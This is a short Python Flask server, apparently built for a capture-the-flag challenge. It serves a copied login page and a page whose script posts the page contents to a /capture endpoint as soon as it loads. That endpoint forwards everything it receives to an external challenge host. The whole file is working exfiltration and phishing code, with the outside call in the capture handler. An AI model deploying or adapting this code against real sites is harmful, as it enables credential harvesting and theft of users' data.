from flask import Flask, request, redirect, send_from_directory
import requests

app = Flask(__name__)

@app.route('/login.htm')
def serve_login():
    return send_from_directory('.', 'login.htm')


@app.route('/', methods=['GET'])
def exfiltration_page():
    return '''
    <!DOCTYPE html>
    <html>
    <body>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Automatically trigger capture endpoint
            fetch('/capture', {
                method: 'POST',
                body: document.documentElement.innerHTML
            });
        });
    </script>
    </body>
    </html>
    '''

@app.route('/capture', methods=['POST'])
def capture_data():
    data = request.data.decode('utf-8')
    
    # Optional: Send to external logging
    requests.post('https://ch717014417.challenges.eng.run/', data=data)
    
    return "Data Captured", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

